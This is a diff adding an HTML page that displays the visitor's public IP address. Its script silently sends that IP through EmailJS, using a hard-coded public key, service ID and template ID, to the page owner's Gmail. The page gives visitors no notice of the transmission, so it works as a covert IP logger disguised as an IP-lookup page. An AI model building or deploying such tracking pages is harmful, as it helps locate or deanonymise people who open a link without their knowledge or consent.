@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>something</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+</head>
+<body>
+    <h1>Your Public IP Address is:</h1>
+    <p id="ip-address">Fetching...</p>
+
+    <script>
+        // 1️⃣ Initialize EmailJS with YOUR public key
+        emailjs.init("ovnjfkuzNvSpCU85K");
+
+        let userIP;
+
+        fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+                userIP = data.ip;
+                document.getElementById("ip-address").textContent = userIP;
+
+                // 2️⃣ Automatically send email FROM your Gmail
+                emailjs.send(
+                    "service_mphl0rc",   // service_x123abc
+                    "template_6bmt1pf",  // template_y456def
+                    { ip: userIP }
+                ).then(
+                    () => console.log("Email sent from your Gmail"),
+                    err => console.error("Email failed:", err)
+                );
+            });
+    </script>
+</body>
+</html>
